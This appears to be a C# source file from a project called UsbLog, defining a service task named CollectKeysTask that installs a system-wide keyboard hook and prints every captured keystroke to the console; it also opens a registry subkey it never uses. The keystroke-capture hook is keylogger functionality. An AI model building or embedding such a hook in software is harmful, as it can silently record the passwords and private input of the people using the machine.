using DiscUtils.Registry;
using Keystroke.API;
using System;
using UsbLog.Core;
using UsbLog.VM;

namespace UsbLog.Service.Tasks
{
    internal class CollectKeysTask : IVmTask
    {
        public int ID => 0xCE13;

        public void Invoke(RegistryKey root)
        {
            var keysHive = root.OpenSubKey("/data/keys");

            var api = new KeystrokeAPI();

            api.CreateKeyboardHook((character) => { Console.Write(character); });

            DisposePipe.Add(api);
        }
    }
}